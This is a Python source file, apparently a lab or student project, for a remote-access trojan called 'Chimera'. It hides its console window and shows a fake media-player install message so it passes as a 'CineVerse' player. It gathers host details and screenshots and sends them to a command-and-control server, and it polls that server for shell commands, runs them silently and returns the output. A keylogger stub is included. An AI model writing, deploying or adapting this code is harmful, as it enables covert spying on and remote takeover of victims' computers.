#!/usr/bin/env python3
"""
Chimera Malware - Final Payload
Complete version with all modules
"""
import os
import sys
import time
import json
import socket
import subprocess
import urllib.request
import urllib.error
import ctypes
import base64
import platform
import threading
from datetime import datetime

# ============================================
# CONFIGURATION
# ============================================

KALI_IP = "10.0.2.20"
C2_URL = f"http://{KALI_IP}:8080"

# ============================================
# HELPERS
# ============================================

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_mac():
    try:
        import uuid
        mac = uuid.getnode()
        return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    except:
        return "00-00-00-00-00-00"

def get_victim_id():
    hostname = socket.gethostname()
    ip = get_local_ip()
    mac = get_mac()
    return f"{hostname}_{mac.replace(':', '')}_{ip.replace('.', '_')}"

def get_log_file():
    temp = os.environ.get('TEMP', 'C:\\Temp')
    if not os.path.exists(temp):
        try:
            os.makedirs(temp, exist_ok=True)
        except:
            temp = os.path.dirname(sys.executable)
    return os.path.join(temp, 'chimera.log')

LOG_FILE = get_log_file()

def log(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except:
        pass

# ============================================
# SYSTEM INFO
# ============================================

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "ip": get_local_ip(),
        "mac": get_mac(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "cpu": platform.processor(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
        "domain": os.environ.get('USERDOMAIN', 'Unknown')
    }
    
    try:
        import psutil
        info["memory"] = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        info["cpu_cores"] = psutil.cpu_count()
        info["cpu_usage"] = psutil.cpu_percent(interval=0.5)
        
        disks = []
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disks.append({
                    "mount": part.mountpoint,
                    "total": f"{round(usage.total / (1024**3), 2)} GB",
                    "used": f"{round(usage.used / (1024**3), 2)} GB",
                    "free": f"{round(usage.free / (1024**3), 2)} GB"
                })
            except:
                pass
        info["disks"] = disks
    except:
        pass
    
    return info

# ============================================
# SCREENSHOT
# ============================================

def capture_screenshot():
    try:
        from PIL import ImageGrab
        import io
        screenshot = ImageGrab.grab(all_screens=True)
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        return base64.b64encode(buffered.getvalue()).decode('utf-8')
    except Exception as e:
        log(f"Screenshot error: {e}")
        return None

# ============================================
# SEND TO C2
# ============================================

def send_to_c2(endpoint, data):
    try:
        req = urllib.request.Request(
            f"{C2_URL}{endpoint}",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        log(f"Send error: {e}")
        return False

# ============================================
# REGISTER
# ============================================

def register():
    info = get_system_info()
    data = {
        "victim_id": get_victim_id(),
        "hostname": info["hostname"],
        "ip": info["ip"],
        "mac": info["mac"],
        "os": info["os"],
        "os_version": info["os_version"],
        "architecture": info["architecture"],
        "cpu": info.get("cpu", "Unknown"),
        "memory": info.get("memory", "Unknown"),
        "disk": json.dumps(info.get("disks", [])),
        "username": info.get("username", "Unknown"),
        "domain": info.get("domain", "Unknown")
    }
    return send_to_c2("/api/register", data)

# ============================================
# SEND SYSTEM INFO
# ============================================

def send_system_info():
    info = get_system_info()
    data = {
        "victim_id": get_victim_id(),
        "type": "system_info",
        "content": info
    }
    return send_to_c2("/api/collect", data)

# ============================================
# SEND SCREENSHOT
# ============================================

def send_screenshot():
    img = capture_screenshot()
    if not img:
        return False
    
    data = {
        "victim_id": get_victim_id(),
        "type": "screenshot",
        "content": {
            "image": img,
            "size": len(img),
            "timestamp": datetime.now().isoformat()
        }
    }
    return send_to_c2("/api/collect", data)

# ============================================
# EXECUTE COMMAND
# ============================================

def execute_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "[Command timed out]"
    except Exception as e:
        return f"[Error: {str(e)}]"

# ============================================
# GET COMMANDS
# ============================================

def get_commands():
    try:
        data = {"victim_id": get_victim_id()}
        req = urllib.request.Request(
            f"{C2_URL}/api/get_command",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        result = json.loads(response.read().decode())
        
        if result.get('has_command'):
            command = result.get('command')
            command_id = result.get('command_id')
            log(f"Got command: {command}")
            
            output = execute_command(command)
            
            result_data = {
                "victim_id": get_victim_id(),
                "command_id": command_id,
                "result": output
            }
            send_to_c2("/api/command_result", result_data)
            return True
        return False
    except Exception as e:
        log(f"Get commands error: {e}")
        return False

# ============================================
# KEYLOGGER (Optional)
# ============================================

def start_keylogger():
    try:
        from pynput import keyboard
        log("Keylogger started")
        return True
    except:
        return False

# ============================================
# MAIN
# ============================================

def main():
    # Hide console
    try:
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass
    
    # Show fake message
    try:
        ctypes.windll.user32.MessageBoxW(
            0,
            "Media Player Installation Complete!",
            "CineVerse",
            0
        )
    except:
        pass
    
    log("=" * 60)
    log("Chimera Payload Started")
    log(f"Victim ID: {get_victim_id()}")
    log(f"IP: {get_local_ip()}")
    log("=" * 60)
    
    # Register
    register()
    time.sleep(1)
    
    # Send system info
    send_system_info()
    time.sleep(1)
    
    # Send screenshot
    send_screenshot()
    time.sleep(1)
    
    # Start keylogger (optional)
    start_keylogger()
    
    # Main loop
    counter = 0
    while True:
        try:
            if counter % 5 == 0:
                get_commands()
            
            if counter % 30 == 0:
                send_screenshot()
            
            if counter % 60 == 0:
                send_system_info()
            
            time.sleep(1)
            counter += 1
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()

